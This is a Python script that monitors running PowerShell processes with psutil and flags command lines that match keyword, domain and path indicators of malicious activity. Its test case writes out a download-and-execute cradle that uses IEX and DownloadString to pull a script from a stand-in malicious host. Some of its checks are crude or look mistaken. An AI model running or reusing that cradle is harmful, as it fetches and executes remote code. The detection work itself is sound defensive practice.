import psutil

# Define a list of known malicious domains
malicious_domains = ["malicious.com", "example.com"]

def is_suspicious(cmdline):
    # Convert the command line to lowercase for case-insensitive matching
    cmdline_lower = cmdline.lower()

    # Suspicious keywords and phrases
    suspicious_keywords = ["Invoke-Expression", "Base64", "DownloadString"]
    for keyword in suspicious_keywords:
        if keyword.lower() in cmdline_lower:
            return True

    # Script block logging indicators
    if '{' in cmdline and '}' in cmdline:
        return True

    # Execution of unsigned scriptsp
    if "Set-ExecutionPolicy" in cmdline and "-Scope" in cmdline and "Unrestricted" not in cmdline:
        return True

    # Check for encoded commands (Base64 or other encoding)
    if "-encodedcommand" in cmdline_lower:
        return True

    # Detect attempts to hide the command with obfuscation techniques
    obfuscation_indicators = ["IEX", "Invoke-Expression"]
    for indicator in obfuscation_indicators:
        if indicator.lower() in cmdline_lower:
            return True

    # Network activity (e.g., downloading from suspicious URLs)
    if "-uri" in cmdline_lower and any(domain in cmdline_lower for domain in malicious_domains):
        return True

    # Suspicious parameters or arguments
    suspicious_parameters = ["-NoProfile", "-WindowStyle Hidden"]
    for param in suspicious_parameters:
        if param.lower() in cmdline_lower:
            return True

    # Contextual checks (e.g., execution from unusual locations)
    contextual_indicators = ["C:\\Temp\\", "Desktop\\"]
    for indicator in contextual_indicators:
        if indicator.lower() in cmdline_lower:
            return True

    # Behavioral analysis checks (e.g., unusual command combinations)
    # Add more behavioral checks here

    # If none of the above criteria match, consider it not suspicious
    return False

def monitor_powershell():
    for process in psutil.process_iter(attrs=['pid', 'name', 'cmdline']):
        if 'powershell' in process.info['name'].lower():
            cmdline = ' '.join(process.info['cmdline'])
            if is_suspicious(cmdline):
                # Log or take action on the suspicious command
                print(f"Suspicious PowerShell Command Detected: {cmdline}")




# Define a test case with a suspicious PowerShell command
test_cmdline = "powershell.exe -command 'Invoke-Expression -Command \"IEX (New-Object Net.WebClient).DownloadString('http://malicious.com/malware.ps1')\"'"
# test_cmdline = "test"

# Test the is_suspicious function with the test_cmdline
if is_suspicious(test_cmdline):
    print("Test: Suspicious PowerShell Command Detected")
else:
    print("Test: No Suspicious PowerShell Command Detected")





# Example usage:
monitor_powershell()
